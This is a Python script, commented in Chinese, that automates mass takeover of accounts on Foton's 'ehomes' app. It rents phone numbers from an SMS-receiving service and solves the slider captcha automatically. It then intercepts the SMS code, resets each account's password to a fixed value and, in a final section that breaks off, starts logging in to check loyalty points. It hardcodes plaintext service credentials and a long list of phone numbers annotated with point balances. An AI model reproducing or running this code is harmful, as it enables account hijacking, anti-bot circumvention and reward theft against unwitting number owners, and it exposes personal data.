import requests
import random
import time
import string
import json
import base64
import logging
import os
import uuid
import re
import numpy as np
from PIL import Image
import io
import time
import datetime

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("foton_verification.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("FotonVerifier")

class FotonVerifier:
    """福田验证码验证和短信获取类"""

    BASE_URL = "https://czyl.foton.com.cn/ehomes-new/homeManager"
    USER_AGENT = "Feature_Alimighty/7.4.9 (iPhone; iOS 17.2.1; Scale/3.00)"



    def __init__(self, phone_number=None):
        """初始化验证器"""
        self.phone_number = phone_number
        self.successful_distances = []
        # 生成一个固定的Cookie，整个流程中使用相同的Cookie
        hwwafsesid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=20))
        hwwafsestime = str(int(time.time() * 1000))
        self.cookie = f"HWWAFSESID={hwwafsesid}; HWWAFSESTIME={hwwafsestime}"
        self.error_count = 0
        self.last_error_type = None
        # 创建调试目录
        self.debug_dirs = ["debug_background", "debug_slide", "debug_result"]
        for dir_name in self.debug_dirs:
            os.makedirs(dir_name, exist_ok=True)
        # 确保debug_result目录存在
        os.makedirs("debug_result", exist_ok=True)
        logger.info(f"初始化生成固定Cookie: {self.cookie}")


    def get_cookie(self):
        """获取当前Cookie"""
        return self.cookie

    def get_headers(self):
        """获取请求头"""
        # 生成请求数据的JSON字符串用于计算Content-Length
        data = {
            "smsCode": "",  # 实际值会在请求时填充
            "version_code": "562",
            "version_name": "7.4.9",
            "regSourceType": "0698",
            "deviceSystem": "17.2.1",
            "safeEnc": int(time.time() * 1000),
            "recommender": "",
            "device_type": "0",
            "idCard": "",
            "ip": "127.0.0.1",
            "tel": self.phone_number if self.phone_number else "",
            "dealerCode": "",
            "idType": "",
            "device_id": str(uuid.uuid4()).upper(),
            "device_model": "iPhone13,4"
        }
        # 计算实际请求体的UTF-8编码字节长度
        content_length = len(json.dumps(data, ensure_ascii=False).encode('utf-8'))

        return {
            "POST": "/ehomes-new/homeManager/regMember2nd HTTP/1.1",
            "Host": "czyl.foton.com.cn",
            "Content-Type": "application/json",
            "Content-Length": str(content_length),
            "Cookie": self.cookie,
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": self.USER_AGENT,
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br"
        }



    def log(self,message):
        """带时间戳的日志函数"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        print(f"[{timestamp}] {message}")

    def get_captcha_images(self):
        """调用第一个API获取验证码图片"""
        url = "https://czyl.foton.com.cn/ehomes-new/homeManager/getImg"

        try:
            self.log("开始获取验证码图片...")
            start_time = time.time()
            response = requests.post(url)
            response.raise_for_status()  # 确保请求成功
            data = response.json()
            elapsed_time = time.time() - start_time

            self.log(f"成功获取验证码图片 (用时: {elapsed_time:.2f}秒)")
            return data
        except Exception as e:
            self.log(f"获取验证码图片失败: {e}")
            return None

    def base64_to_image(self,base64_string):
        """将base64字符串转换为PIL图像对象"""
        try:
            self.log("开始将base64转换为图像...")
            start_time = time.time()

            # 如果base64字符串包含头部信息，需要去除
            if ',' in base64_string:
                base64_string = base64_string.split(',')[1]

            # 解码base64字符串
            image_data = base64.b64decode(base64_string)

            # 创建PIL图像对象
            image = Image.open(io.BytesIO(image_data))

            elapsed_time = time.time() - start_time
            self.log(f"成功转换base64为图像 (用时: {elapsed_time:.2f}秒)")
            return image
        except Exception as e:
            self.log(f"base64转图像失败: {e}")
            return None

    def get_leftmost_transparent_x(self,image):
        """获取图像中最左边的像素的X坐标"""
        try:
            self.log("开始识别最左边像素...")
            start_time = time.time()

            # 确保图像有Alpha通道
            if image.mode != 'RGBA':
                image = image.convert('RGBA')

            # 转换为numpy数组
            img_array = np.array(image)

            # 获取Alpha通道
            alpha = img_array[:, :, 3]

            # 图像尺寸
            height, width = alpha.shape
            self.log(f"图像尺寸: {width}x{height}")

            # 从左到右逐列扫描
            for x in range(width):
                for y in range(height):
                    if alpha[y, x] < 255:  # 找到或半像素
                        elapsed_time = time.time() - start_time
                        self.log(f"找到最左边像素，X坐标: {x} (用时: {elapsed_time:.2f}秒)")
                        return x

            elapsed_time = time.time() - start_time
            self.log(f"图像中没有像素 (用时: {elapsed_time:.2f}秒)")
            return None
        except Exception as e:
            self.log(f"识别像素失败: {e}")
            return None

    def verify_captcha(self,img_key, x_distance):
        """调用第二个API验证验证码"""
        url = "https://czyl.foton.com.cn/ehomes-new/homeManager/verifyImgCode"

        payload = {
            "yzmimgKey": img_key,
            "xDistance": x_distance
        }
        time.sleep(random.uniform(1, 2))
        try:
            self.log(f"开始验证验证码，参数: yzmimgKey={img_key}, xDistance={x_distance}...")
            start_time = time.time()
            response = requests.post(url, json=payload)
            response.raise_for_status()
            result = response.json()
            elapsed_time = time.time() - start_time

            self.log(f"验证结果: {result} (用时: {elapsed_time:.2f}秒)")
            return result
        except Exception as e:
            self.log(f"验证失败: {e}")
            return None

    def get_img_key(self):
        self.log("开始执行验证码识别流程")
        total_start_time = time.time()

        # 步骤1: 获取验证码图片
        captcha_data = self.get_captcha_images()
        if not captcha_data:
            self.log("无法继续，获取验证码图片失败")
            return

        # 提取需要的数据
        ori_copy_image = captcha_data.get('oriCopyImage')
        img_key = captcha_data.get('imgXKey')

        if not ori_copy_image or not img_key:
            self.log("API响应中缺少必要的数据")
            return

        # 步骤2: 将base64字符串转换为图像
        image = self.base64_to_image(ori_copy_image)
        if image is None:
            self.log("无法继续，base64转图像失败")
            return

        # 步骤3: 获取最左边像素的X坐标
        x_coordinate = self.get_leftmost_transparent_x(image)
        if x_coordinate is None:
            self.log("无法继续，未能识别像素")
            return

        # 步骤4: 调用验证API
        verify_result = self.verify_captcha(img_key, x_coordinate)

        # 计算总用时
        total_elapsed_time = time.time() - total_start_time

        # 输出完整结果
        self.log(f"完整流程结果:")
        self.log(f"imgXKey: {img_key}")
        self.log(f"识别到的X坐标: {x_coordinate}")
        self.log(f"验证结果: {verify_result}")
        self.log(f"总用时: {total_elapsed_time:.2f}秒")
        return img_key,x_coordinate


    def get_sms_code(self, img_token, x_distance):
        """获取短信验证码"""
        if not self.phone_number:
            logger.error("未提供手机号，无法获取短信验证码")
            return {"error": "未提供手机号"}

        # 更新请求URL
        url = f"{self.BASE_URL}/getSmsCodeNew"

        # 更新请求数据结构
        data = {
            "yzmimgKey": img_token,
            "type": "2",  # 根据抓包信息添加type字段
            "msgyzm": str(x_distance),
            "tel": self.phone_number
        }

        try:
            logger.info(f"尝试获取短信验证码，手机号: {self.phone_number}")
            logger.debug(f"短信请求数据: {data}")

            response = requests.post(url, headers=self.get_headers(), json=data, timeout=10)
            logger.info(f"短信请求响应状态: {response.status_code}")
            logger.info(f"短信请求响应内容: {response.text}")

            if response.status_code == 200:
                response_data = response.json()
                if response_data.get("code") == 200:
                    logger.info("短信验证码发送成功")
                return response_data

            return {"error": f"请求失败，状态码: {response.status_code}"}

        except requests.RequestException as e:
            logger.error(f"短信请求异常: {str(e)}")
            return {"error": f"请求异常: {str(e)}"}

    def release_number(self, phone_number):
        """释放手机号码资源"""
        logger.info(f"释放手机号: {phone_number}")
        # 这里可以添加实际的释放逻辑，比如调用API或清理资源
        return {"code": 200, "message": "号码释放成功"}

    def complete_verification_and_get_sms(self):
        """完成验证并获取短信验证码 - 增强版"""
        img_token,successful_distance = self.get_img_key()
        sms_result = self.get_sms_code(img_token, successful_distance)

        if sms_result.get("code") == 200:
            logger.info("获取短信验证码成功！")
            # 获取到验证码后立即返回结果
            return {
                "status": "success",
                "code": sms_result.get("code"),
                "message": sms_result.get("message"),
                "verification_code": sms_result.get("code")  # 假设验证码在code字段中
            }
        else:
            logger.error(f"获取短信验证码失败: {sms_result}")

            # 根据错误信息调整策略
            error_msg = sms_result.get("msg", "")
            if "频繁" in error_msg:
                time.sleep(random.uniform(5, 8))
            else:
                time.sleep(random.uniform(2, 3))

            # 如果错误代码是500，释放号码并重新开始流程
            if sms_result.get("code") == 500:
                logger.info("释放号码并重新开始流程")
                # 释放号码逻辑
                release_result = self.release_number(self.phone_number)
                if release_result.get("code") == 200:
                    logger.info(f"成功释放手机号: {self.phone_number}")
                else:
                    logger.error(f"释放手机号失败: {release_result}")

                # 等待一段时间后重新开始流程
                time.sleep(random.uniform(3, 5))

        return {"error": f"失败"}


class YeziPlatform:
    """椰子平台API封装"""

    def __init__(self, username, password, project_id):
        self.username = username
        self.password = password
        self.project_id = project_id
        self.token = None
        self.base_url = "http://api.sqhyw.net:90/api"

        # 登录获取token
        self.login()

    def login(self):
        """登录获取token"""
        url = f"{self.base_url}/logins"
        params = {
            'username': self.username,
            'password': self.password
        }

        try:
            logger.info(f"尝试登录椰子平台... 用户名: {self.username}")
            response = requests.get(url, params=params, timeout=10)
            logger.info(f"登录响应状态码: {response.status_code}")
            logger.info(f"登录响应内容: {response.text}")

            if response.status_code == 200:
                login_data = response.json()
                self.token = login_data.get("token")
                if self.token:
                    logger.info(f"登录成功，获取到token: {self.token}")
                else:
                    logger.error(f"登录响应成功但获取token失败: {login_data}")
            else:
                logger.error(f"登录失败，状态码: {response.status_code}")
        except Exception as e:
            logger.error(f"登录请求异常: {str(e)}")

    def get_phone_number(self, special=None, phone_num=None, scope=None):
        """获取手机号"""
        if not self.token:
            logger.error("未登录或token无效，尝试重新登录")
            self.login()
            if not self.token:
                return None

        url = f"{self.base_url}/get_mobile"
        params = {
            'token': self.token,
            'project_id': self.project_id,
            #'scope': "185,171,153"
            #'scope': "171"
            'scope_black':"192,188,159,187,158,152,167,165,181,180,177,173,189,133,195,153"
            #'scope_black':"181,180,177,173"
        }

        # 添加可选参数
        if special:
            params['special'] = special
        if phone_num:
            params['phone_num'] = phone_num
        if scope:
            params['scope'] = scope

        try:
            logger.info(f"尝试获取手机号... 项目ID: {self.project_id}")
            logger.debug(f"请求参数: {params}")

            response = requests.get(url, params=params, timeout=10)
            logger.info(f"获取手机号响应状态码: {response.status_code}")
            logger.info(f"获取手机号响应内容: {response.text}")

            if response.status_code == 200:
                data = response.json()
                # 检查 message 而不是 code
                if data.get("message") == "ok" and data.get("mobile"):
                    mobile = data.get("mobile")
                    logger.info(f"成功获取手机号: {mobile}")
                    return mobile
                else:
                    logger.error(f"获取手机号失败: {data.get('message', '未知错误')}")
            return None
        except Exception as e:
            logger.error(f"获取手机号请求异常: {str(e)}")
            return None

    def free_mobile(self, phone_number, special=None):
        """释放手机号"""
        if not self.token:
            logger.error("未登录或token无效，尝试重新登录")
            self.login()
            if not self.token:
                return False

        url = f"{self.base_url}/free_mobile"
        params = {
            'token': self.token,
            'project_id': self.project_id,
            'phone_num': phone_number
        }

        # 添加可选参数
        if special:
            params['special'] = special

        try:
            logger.info(f"尝试释放手机号: {phone_number}")
            logger.debug(f"释放请求参数: {params}")

            response = requests.get(url, params=params, timeout=10)
            logger.info(f"释放手机号响应状态码: {response.status_code}")
            logger.info(f"释放手机号响应内容: {response.text}")

            if response.status_code == 200:
                data = response.json()
                if data.get("message") == "ok":
                    logger.info(f"成功释放手机号: {phone_number}")
                    return True
                else:
                    logger.error(f"释放手机号失败: {data.get('message', '未知错误')}")
            return False
        except Exception as e:
            logger.error(f"释放手机号请求异常: {str(e)}")
            return False

    def get_sms_content(self, phone_number, special=None, max_attempts=12, interval=5):
        """获取短信内容"""
        if not self.token:
            logger.error("未登录或token无效，尝试重新登录")
            self.login()
            if not self.token:
                return {"error": "获取token失败，无法获取短信"}

        url = f"{self.base_url}/get_message"
        params = {
            'token': self.token,
            'project_id': self.project_id,
            'phone_num': phone_number
        }

        # 添加可选参数
        if special:
            params['special'] = special

        logger.info(f"开始获取手机号 {phone_number} 的短信内容")
        logger.debug(f"请求参数: {params}")

        for attempt in range(max_attempts):
            try:
                logger.info(f"第 {attempt+1} 次尝试获取短信内容")
                response = requests.get(url, params=params, timeout=10)
                logger.info(f"获取短信响应状态码: {response.status_code}")
                logger.info(f"获取短信响应内容: {response.text}")

                if response.status_code == 200:
                    data = response.json()
                    # 检查是否有短信内容
                    if data.get("message") == "ok" and (data.get("data") and len(data["data"]) > 0 or data.get("code")):
                        sms_content = ""
                        verification_code = data.get("code", "")

                        if data.get("data") and len(data["data"]) > 0:
                            sms_content = data["data"][0].get("modle", "")

                        # 如果没有直接提供验证码，尝试从短信内容中提取
                        if not verification_code and sms_content:
                            code_patterns = [
                                r'验证码[是为:]?\s*([0-9]{4,6})',
                                r'码[是为:]?\s*([0-9]{4,6})',
                                r'([0-9]{4,6})[^0-9]'
                            ]
                            for pattern in code_patterns:
                                match = re.search(pattern, sms_content)
                                if match:
                                    verification_code = match.group(1)
                                    break

                        result = {
                            "success": True,
                            "sms_content": sms_content,
                            "verification_code": verification_code
                        }

                        logger.info(f"成功获取短信内容: {sms_content}")
                        if verification_code:
                            logger.info(f"验证码: {verification_code}")
                        else:
                            logger.warning(f"未能从短信中提取到验证码")

                        return result
                    elif "等待" in data.get("message", "") or (data.get("message") == "ok" and (not data.get("data") or len(data["data"]) == 0)):
                        logger.info("短信尚未收到，等待下一次查询")
                    else:
                        logger.warning(f"获取短信失败: {data.get('message', '未知错误')}")
                else:
                    logger.error(f"获取短信请求失败，状态码: {response.status_code}")

                # 如果达到最大尝试次数，返回失败
                if attempt == max_attempts - 1:
                    return {"error": "获取短信超时，达到最大尝试次数"}

                # 等待一段时间后再次尝试
                time.sleep(interval)

            except Exception as e:
                logger.error(f"获取短信请求异常: {str(e)}")
                if attempt == max_attempts - 1:
                    return {"error": f"获取短信异常: {str(e)}"}
                time.sleep(interval)

        return {"error": "获取短信超时"}


def main():
    """主函数"""
    # 配置参数
    username = "18736805971"#椰子账号
    password = "zxcvbnm0129."#椰子密码
    project_id = "865765" #已跑：----55Z7TD #865765
    target_success_count = 5  # 需要成功修改密码的手机号数量
    current_success_count = 0
    successful_phones = []  # 用于存储成功完成的手机号
    query_integral = 1 # 是否查询积分
    query_repetition = 1 # 是否检测重复号
    update_password = 'stars123456' #修改后的密码
    # 已检测过的手机号 能登录1 跑着1 在线1 #1 0 0 #1 0 1 #1 1 1 #1 1 0
    detection_phone = [
        '17718134914',#1 1 1
        '15105652539',#0 1 1
        '17354014010',#1 0 0
        '17354189244',#1 1 0 -
        '19956003446',#1 1 0 -
        '17719484291',#1 1 0 -
        '17333263531',#0 0 0
        '13265626739',#0 1 1
        '18919684425',#1 1 0 -
        '17756071402',#1 1 0 -
        '17356504874',#1 0 0
        '17756582704',#1 0 0
        '13168079319',#0 1 1
        '17305602574',#1 1 0 -
        '17354020514',#0 1 1
        '17756590704',#0 1 1
        '18955170632',#1 1 0 -
        '17354043347',#0 1 1
        '17764432371',#1 1 0 -
        '17719472145',#0 1 1
        '17352965724',#1 1 0 -
        '13129543575',#0 0 1
        '13113862042',#0 1 1
        '17705691024',#0 1 1
        '17368873440',#1 1 0 -
        '17309694419',#1 1 0 -
        '17775321754',#1 0 0
        '17756074414',#1 1 0 -
        '17352969774',#0 1 1 -
        '19965051744',#1 1 0 -
        '17764435909',#0 1 1
        '17354078213',#1 0 0
        '17354034294',#1 0 0
        '17764461145',#1 1 0 -
        '13402000533',#0 1 1
        '19155147129',#1 1 0
        '19966143044',#1 1 0
        '13329014425',#1 0 0
        '18955181729',#0 1 1
        '13395601436',#1 1 0 -
        '13144839059',#1 0 1
        '13143443093',#0 1 1
        '15156212038',#0 1 1
        '13267053034',#0 0 1
        '17354091414',#0 1 1
        '18155154649',#1 1 1
        '18110406412',#0 1 1
        '18721434801',#0 0 1
        '17354127873',#0 1 1
        '15315376694',#0 1 1
        '15375360453',#0 1 1
        '17719492085',#1 1 1
        '15900616954',#0 1 1
        '17333216417',#1 1 1
        '13524506232',#0 1 1
        '17352961423',#0 1 1
        '17305605247',#0 1 1
        '18119633792',#0 1 1
        '13097274757',#0 1 0
        '18579207388',#13000 已注销更换手机
        '17318578445',#1 1 1
        '13037279175',#其他项目
        '18110407943',#0 1 0
        '18154121249',#0 1 0
        '17821832945',#0 1 1
        '18119680840',#0 1 0
        '13058147830',#0 1 1
        '13641794464',#1228 #0 1 1
        '13764555292',#1348 #0 1 1
        '13524502110',#0 1 1
        '13524501556',#0 1 1
        '13113862744',#0 1 1
        '18721440079',#0 1 1
        '19821922783',#0 1 1
        '15395039841',#1 0 0
        '17333239814',#0 1 0
        '17821837824',#0 1 1
        '17354084144',#0 1 0
        '15357934462',#0 1 0
        '13524440956',#0 1 1
        '17115740268',#0 1 1
        '13524379289',#0 1 1
        '18321883317',#1 0 1
        '18721417807',#0 1 1
        '13144826031',#0 1 1
        '13147086928',#0 1 1
        '13144806237',#0 1 1
        '13048911764',#0 1 1
        '17137518306',#1 0 1
        '17179128464',# 14000 未注销更换手机
        '17115740267',#0 1 1
        '13189724373',#0 1 1
        '13043483324',#1 0 1
        '13164758105',#0 1 1
        '13143421509',#0 1 1
        '17821824963',# 积分
        '17179128434',#1 0 1
        '17175835687',#1 0 1
        '13524506289',#0 1 1
        '13027967445',#1 1 1
        '17179127841',#15000 已注销更换手机 6.28
        '17173455306',#黑
        '13500511434',#备用
        '15375403431',#25556
        '18321045746',#0 1 1
        '17170586751',#0 1 1
        '15000848629',#0 1 1
        '13246791016',#0 1 1
        '13764557515',#0 1 1
        '19056887370',#1 1 0
        '17179128419',#注销
        '15324403650',
        '13145895139',
        '13524396943',
        '13524740759',
        '18321332934',
        '17178963046',#1496
        '17821984985',
        '13764555561',
        '17137687043',#1396
        '13524385738',
        '17821011723',
        '13189747917',
        '17136618656',#2796
        '17178962411',#1496
        '17136618739',#1496
        '13349203874',
        '13242097946',
        '19055151934',
        '19821919091',
        '13524501748',
        '17153156230',#1486
        '19556559973',
        '13524501492',#黑
        '17821834120',#黑
        '13764553791',#黑
        '17179128476',#15072
        '13246790435',#黑
        '19965026104',
        '13402049455',#黑
        '17821955945',#黑
        '17175835719',#1496
        '17173452615',#1496
        '19556559132',
        '13355650984',
        '15056995462',
        '17178964198',#1496
        '13027964744',#黑
        '15056987434',
        '17821833642',#黑
        '17191013824',#1496
        '19056887361',
        '15375083482',
        '13524501467',#黑
        '17178965543',#1496
        '13402037533',
        '17101818184',#1536
        '17193341621',#1516
        '17128442375',#1436
        '13113692743',#黑
        '17119856064',#1536
        '17128441158',#1536
        '17178964677',#1536
        '17178968104',#1536
        '17178962434',#1536
        '17128442377',#1536
        '17153156269',#1536
        '13049317014',#注销
        '17821825490',#黑
        '17136618651',#1536
        '17178968417',#1436
        '13049807144',#黑
        '13048909412',
        '13045854164',#黑
        '13265524714',#黑
        '13128976950',#积分
        '13524395367',#黑
        '15055704946',
        '19956555702',
        '13500506424',
        '19315269556',
        '13005437160',#黑
        '13129596083',#黑
        '17821964091',
        '13164790785',#黑
        '13113865915',
        '13244748751',#1236
        '17821836184',#黑
        '13049364921',#700
        '13524508423',#黑
        '13164782253',#528
        '19821919082',#黑
        '17821963941',#黑
        '13524386537',#黑
        '18321857093',#黑
        '13524507357',#黑
        '13524494120',#黑
        '13172486025',
        '18155137328',#备用
        '17128441941',
        '15357958243',#备用
        '13172453506',#黑
        '19956076991',#备用
        '13524506590',#黑
        '13026601957',#黑
        '13514962147',#备用
        '17143638137',#备用
        '17197087327',#备用
        '17159037423',
        '13696544652',#备用
        '15695656024',
        '13524502434',#黑
        '17159037489',
        '19355930121',#备用
        '13635654691',#备用
        '17151746640',
        '13144837031',#黑
        '17368855260',#备用
        '17821836114',#黑
        '19314033096',
        '17101811664',
        '18158869932',
        '19314017320',#备用
        '19315270290',
        '18158872480',
        '13514988460',
        '19356065592',#备用
        '19305602276',#备用
        '15519545249',
        '17368855385',
        '13696548140',
        '19356066018',
        '13696545514',
        '18105608198',
        '18119688041',
        '18158951215',
        '18585413049',
        '18956033247',
        '15170184844',#10374 注销
        '15656524063',
        '19314098992',
        '15180275965',#黑
        '18321858180',#黑
        '15375430804',
        '15656915301',
        '13514964071',
        '19392805523',
        '15156545981',
        '15083701045',
        '13144824610',
        '13514967482',
        '16655036435',
        '19356065816',
        '15656521482',
        '15391984693',
        '13647973810',
        '16655016354',
        '19356065208',
        '13265442964',
        '13479991317',
        '16655108743',
        '15305698541',
        '13148863025',
        '13514965124',
        '18956044381',
        '19356065880',
        '19821922792',
        '18955132846',
        '19356065902',
        '13698060274',
        '15395032462',
        '13870772564',
        '19356585572',
        '19356065116',
        '13698072084',#4580
        '13696549408',
        '15180273584',#5878
        '15083596263',
        '16655124463',
        '18370424366',
        '15055704672',
        '18296788942',#6722
        '19356063923',
        '13226871981',#黑
        '15179713054',#黑
        '19314039553',#3358
        '16655118534',
        '13755266574',#黑
        '19965169625',
        '19356065221',
        '15770734922',#10374 注销
        '15056969548',
        '13879772474',#黑
        '13755266147',
        '19356065696',
        '15056954752',
        '13696542783',
        '13696534840',
        '13524235605',#黑
        '19314033827',
        '19355102051',
        '19355930156',
        '19821919320',#黑
        '18900516942',
        '18963787844',
        '18955134340',
        '19314018863',
        '13514974462',
        '19356592679',
        '18956011471',
        '19314039973',
        '13764556305',#黑
        '19355966970',
        '13500514864',
        '19956052179',
        '18956087390',
        '19314043396',
        '19356553134',
        '13514963295',
        '19956066214',
        '18955195407',
        '18955197784',
        '15507524749',
        '13164796780',
        '18955144536',
        '13128915675',
        '18949898513',
        '15385895492',
        '19956042624',
        '13524506461',#黑
        '15375295473',
        '13514962418',
        '18919604914',
        '17503087940',#黑
        '18503021327',
        '13246608738',
        '13225549951',
        '13514983437',
        '13625643740',
        '18594132856',
        '13083081835',
        '13514972549',
        '19355903367',
        '18909691465',
        '19966530394',
        '18956022464',
        '13696533284',
        '19105696940',
        '18655401762',
        '13155419057',
        '15055194674',
        '15056979044',
        '15656587293',
        '13696512749',
        '15551877630',
        '19155142704',
        '15357778034',
        '19334086074',
        '19159080436',
        '15077906143',
        '15375046720',
        '13514984945',
        '19105604974',
        '15395169754',
        '13167729721',
        '13514975690',
        '15656925923',
        '15395023154',
        '13696504439',
        '13696524417',
        '15309699341',
        '19956505384',
        '13514960449',
        '19966484549',
        '19155165824',
        '19956050846',
        '17821959741',
        '13145515907',
        '15056990144',
        '13524240045',
        '13505694841',
        '19355903252',
        '13524385907',
        '13402050377',
        '13524505172',
        '13095368283',#3940
        '15695562901',
        '15687758905',#4014
        '13045567335',
        '15687147605',
        '13074016515',
        '15687110912',
        '15656548335',
        '13095367169',#3158
        '13095331392',
        '13365741846',
        '15687110165',#3716
        '13095333552',#3180
        '19821919035',
        '13145563515',
        '13095335921',#3616
        '13095337961',
        '16655012694',
        '15395138670',
        '15694666021',
        '13095366739',
        '13074079597',
        '15694668103',
        '13095356590',
        '15687113713',
        '13095333923',
        '15395023824',
        '15687110213',
        '13095365038',
        '13329015248',
        '13095303001',
        '13275749335',
        '16655123364',
        '15687115782',#3226
        '15375241438',
        '15687118709',#2850
        '15324401450',
        '15687117103',#4024
        '15375443348',
        '15687182105',
        '13145510185',
        '15687110327',
        '13095359906',
        '15687115937',
        '15656547650',
        '15375485842',
        '15656548670',
        '15694660291',
        '13305694463',
        '15694660139',
        '15694669107',
        '15694665957',
        '15694668293',#3856
        '13095336301',
        '13095353628',
        '13095301591',
        '13095366528',
        '13095351078',#3654
        '15687116109',#3236
        '15687759657',#3974
        '15687110175',
        '17555129863',
        '17153156227',
        '17153156243',
        '15385174744',
        '13275745095',#25550
        '13075574605',
        '13695652423',
        '17143690501',
        '15375342834',
        '13696514175',
        '15655163792',
        '13167749725',
        '13365696484',
        '19855101898',
        '13696532374',
        '13696525344',
        '13083412830',
        '15655696301',
        '13696503554',
        '18256070127',
        '13275693705',
        '15375462824',
        '15375407224',
        '13135403103',
        '15375430934',
        '15395519147',
        '17143690781',
        '13083415303',
        '13696515405',
        '13696516274',
        '13145569581',
        '15375247428',
        '13063441613',
        '13696527043',
        '13349114204',
        '13385697846',
        '13275872185',
        '17143690776',
        '13156572491',
        '13074049271',
        '13275862105',
        '17193341622',
        '15609629270',
        '17143690772',
        '13095307035',
        '13083413390',
        '13696527441',
        '13095359160',
        '19719216710',
        '15694667108',
        '15694668515',
        '13170282132',
        '15687111206',#4812
        '19855100985',
        '15357914894',
        '13063440610',
        '15694666953',
        '13170289070',
        '13696505948',
        '18654165603',
        '13095358607',#3884
        '19556581382',
        '19556581165',
        '15395130263',
        '15687111910',
        '15694660780',
        '18655149397',
        '15375261423',
        '15324402761',
        '13095368761',
        '19505650591',
        '13095308337',#3944
        '13095362068',#2340
        '15391978741',
        '15687115228',
        '13095360237',
        '15694665596',
        '13695696494',
        '19720565356',
        '13075597182',
        '13156530583',
        '19505652720',
        '15687116871',
        '15687183727',
        '13093408063',
        '13696530349',
        '13095368165',
        '19720567160',
        '19720566975',
        '19855102867',
        '15687183675',
        '13095337027',
        '13095457630',
        '13696522045',
        '13695694126',
        '15687116201',
        '13095360060',
        '13095368993',#4144
        '13095332306',
        '15687759738',
        '13339106574',
        '13696529847',
        '13095350668',#4252
        '13095360807',
        '17368831615',
        '17354104784',
        '18155103398',
        '18056038264',
        '18155109257',
        '18133678460',
        '17718147121',
        '18110913873',
        '17355195705',
        '17355191552',
        '17756047129',
        '17718152316',
        '17756026704',
        '17775344130',
        '17756594774',
        '15694668121',#3904
        '13095308058',#3974
        '13095358572',
        '15694665378',#3376
        '13095362157',#2410
        '13095369723',#2430
        '13095365063',#3794
        '15687115732',
        '15694661727',
        '15687182787',#2430
        '13095303109',
        '15694661836',
        '13095366629',
        '15694665675',
        '13339016664',
        '13335518564',
        '19556595815',
        '19556031820',
        '19556076308',
        '15375281857',
        '13305697174',
        '19556573657',
        '15375304795',
        '13385694761',
        '13365517064',
        '13399699504',
        '19556032782',
        '13339146934',
        '19556521850',
        '13093313135',#26500
        '19856539793',
        '15375053863',
        '19856537080',
        '15309695264',
        '15339694437',
        '15375312657',
        '15375101758',
        '15375239102',
        '15055700246',
        '18297919565',
        '15309695624',
        '15395091846',
        '15309697064',
        '15375344883',
        '15345697742',
        '15375243914',
        '15345697346',
        '15357922204',
        '13099460853',
        '13093316292',#25000
        '13095343995',
        '13095343761',
        '13095322724',
        '13095342551',
        '13099423196',
        '13095343723',
        '13099420579',#9400
        '13095345976',
        '13095347818',
        '13095346319',
        '13095339524',
        '13095308471',
        '15656546061',
        '13095312457',
        '13095310486',#9500
        '13514972504',
        '13095345735',
        '13095348201',
        '13099406061',
        '13095343917',
        '17505694980',#24800
        '13099420152',
        '13099460775',
        '13099460573',
        '13099459032',#26842
        '13095340150',
        '13095345163',#26842
        '13099461537',
        '17356581840',#腾
        '15395010784',
        '13126476472',
        # stars123456
    ]

    # 初始化椰子平台
    yezi = YeziPlatform(username, password, project_id)

    while current_success_count < target_success_count:
        try:
            # 获取手机号
            phone_number = yezi.get_phone_number()
            if not phone_number:
                logger.error("获取手机号失败")
                time.sleep(3)
                continue

            logger.info(f"获取到手机号: {phone_number}")

            # 检测获取到的手机号是否在detection_phone数组中
            if query_repetition == 1:
                if phone_number in detection_phone:
                    logger.info(f"手机号 {phone_number} 已在检测列表中，跳过并重新获取")
                    yezi.free_mobile(phone_number)
                    time.sleep(3)
                    continue

            # 初始化验证器
            verifier = FotonVerifier(phone_number)
            result = verifier.complete_verification_and_get_sms()

            logger.info("短信发送结果:")
            logger.info(result)

            if result.get("code") == 200:
                # 获取短信验证码内容
                logger.info("开始获取短信验证码内容...")
                sms_result = yezi.get_sms_content(phone_number)

                if sms_result.get("success"):
                    logger.info(f"成功获取短信内容: {sms_result.get('sms_content')}")
                    logger.info(f"提取的验证码: {sms_result.get('verification_code')}")
                    logger.info(f"验证成功的手机号: {phone_number}")

                    # 构建修改密码请求
                    update_data = {
                        "memberId": "",
                        "password": update_password, #"stars123",#要修改的手机号
                        "smsCode": sms_result.get("verification_code"),
                        "ip": "127.0.0.1",
                        "tel": phone_number
                    }

                    # 发送修改密码请求
                    update_response = requests.post(
                        f"{verifier.BASE_URL}/userUpdatePassword",
                        headers=verifier.get_headers(),
                        json=update_data,
                        timeout=10
                    )

                    update_result = update_response.json()
                    logger.info(f"密码修改响应: {update_result}")
                    successful_phones.append(phone_number)  # 记录成功的手机号
                    current_success_count += 1
                    logger.info(f"当前成功数量: {current_success_count}/{target_success_count}")
                else:
                    logger.error(f"获取短信内容失败: {sms_result.get('error')}")
                    yezi.free_mobile(phone_number)
                    time.sleep(3)
            else:
                logger.warning(f"验证失败，释放手机号并重试: {result}")
                yezi.free_mobile(phone_number)
                time.sleep(3)

        except Exception as e:
            logger.error(f"验证过程出错: {str(e)}")
            if phone_number:
                yezi.free_mobile(phone_number)
            time.sleep(3)

    logger.info(f"已完成 {target_success_count} 个手机号的密码修改")
    if successful_phones:
        logger.info(f"成功完成的手机号列表: {','.join(successful_phones)}")

        # 添加积分查询功能
        if query_integral == 1:

            from dataclasses import dataclass
            from typing import Optional

            @dataclass
            class LoginResult:
                token: Optional[str] = None
                memberId: Optional[str] = None
                uid: Optional[str] = None
                phone: Optional[str] = None

            def login(phone: str, password: str) -> LoginResult:
                url = "https://czyl.foton.com.cn/ehomes-new/homeManager/getLoginMember"
                body = {
                    "version_name": "",
                    "checkCode": "",
                    "redisCheckCodeKey": "",
                    "deviceSystem": "17.2.1",
                    "version_auth": "VLQJq+FS9pSFabxQgcaDhA==",
                    "device_type": "0",
                    "password": password,
                    "ip": "127.0.0.1",
                    "device_id": "7AD11E8D-EC8F-4194-939F-BE62704DCFB7",
                    "version_code": "0",
                    "name": phone,
                    "device_model": "iPhone13,4"
                }

                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Feature_Alimighty/7.4.9 (iPhone; iOS 17.2.1; Scale/3.00)"
                }

                # 增加重试机制
                max_retries = 3
